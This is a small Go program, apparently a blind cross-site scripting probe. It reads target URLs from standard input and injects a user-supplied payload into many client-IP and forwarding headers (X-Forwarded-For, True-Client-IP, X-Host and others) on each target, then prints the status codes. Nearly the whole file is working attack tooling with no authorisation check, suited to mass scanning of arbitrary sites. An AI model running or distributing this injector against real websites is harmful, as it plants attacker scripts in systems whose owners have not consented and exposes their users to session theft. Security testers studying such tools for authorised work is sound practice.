package main
import "os"
import "fmt"
import "bufio"
import "strings"
import "github.com/valyala/fasthttp"

var (
headers = [...]string{
		"X-Originating-IP",
		"X-Forwarded-For",
                "X-Forwarded",
                "Forwarded-For",
                "X-Remote-IP",
                "X-Remote-Addr",
                "X-ProxyUser-Ip",
                "X-Original-URL",
                "Client-IP",
                "True-Client-IP",
                "Cluster-Client-IP",
                "X-ProxyUser-Ip",
                "X-Host",
                "X-Forwarded-Server",
                "X-HTTP-Host-Override",
               }
)


func probes (payload string,url string) {
        req := fasthttp.AcquireRequest()
        req.SetRequestURI(url)
     for _,e := range headers{
        req.Header.Add(e, payload)
        }
        resp := fasthttp.AcquireResponse()
        client := &fasthttp.Client{}
        statusCode, _, _ := client.Get(nil, url)
        client.Do(req, resp)
        sc := resp.StatusCode()
        fmt.Println(url,"BXss payload send:",sc,"hostheader check:",statusCode)
}

func main() {
scanner := bufio.NewScanner(os.Stdin)
payload := os.Args[1]
for scanner.Scan() {
		target := strings.TrimSpace(scanner.Text())
                probes(payload,target)
}

}
